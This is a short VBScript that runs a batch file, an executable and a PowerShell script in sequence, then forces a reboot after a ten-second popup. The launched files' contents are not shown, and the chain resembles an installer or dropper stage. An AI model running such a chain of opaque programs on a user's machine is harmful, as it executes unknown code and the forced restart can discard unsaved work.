DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )

CreateObject("Wscript.Shell").Run """b.bat""", 1, True
CreateObject("Wscript.Shell").Run """file.exe""", 1, True
CreateObject("Wscript.Shell").Run """pyC\a.ps1""", 1, True

Set objShell = CreateObject("WScript.Shell")
objShell.Popup "The computer will restart in 10 seconds.", 10, "Restarting", vbInformation + vbOKOnly
objShell.Run "shutdown.exe /r /t 10 /f", 1, False
